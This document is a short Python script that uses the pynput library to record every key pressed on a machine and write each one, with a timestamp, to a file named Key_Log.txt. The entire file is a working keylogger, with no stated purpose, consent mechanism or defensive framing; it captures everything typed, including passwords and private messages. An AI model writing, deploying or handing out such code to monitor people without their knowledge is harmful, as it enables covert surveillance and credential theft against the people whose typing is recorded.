from pynput.keyboard import Key , Listener
import logging

__dir__ = ''

logging.basicConfig(filename=(__dir__ + 'Key_Log.txt'),level = logging.DEBUG , format = '%(asctime)s >>> %(message)s' )

def on_press(key):
	logging.info(key)

with Listener(on_press=on_press) as listener:
	listener.join()